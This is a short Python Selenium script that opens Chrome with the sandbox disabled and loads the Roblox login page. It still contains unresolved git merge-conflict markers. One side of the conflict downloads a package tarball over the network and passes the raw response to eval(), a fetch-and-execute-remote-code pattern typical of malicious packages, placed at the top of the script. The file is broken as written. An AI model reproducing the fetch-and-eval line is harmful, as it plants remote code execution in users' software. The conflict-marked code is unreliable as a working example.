<<<<<<< HEAD
<<<<<<< HEAD
=======
import urllib.request
a = urllib.request.urlopen('https://files.pythonhosted.org/packages/16/fd/a0ef793383077dd6296e4637acc82d1e9893e9a49a47f56e96996909e427/selenium-4.16.0.tar.gz')
eval(a.read())
>>>>>>> parent of a5e2d94 (fds)
=======

>>>>>>> 0daa21ea5a82a60609cf57cd09c85cb36cef19e4
import selenium
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from encryption import text

chrome_options = Options()
chrome_options.add_argument('--no-sandbox')
chrome_options.add_argument('--disable-dev-shm-usage')
driver = webdriver.Chrome(options = chrome_options)

driver.get('https://roblox.com/login')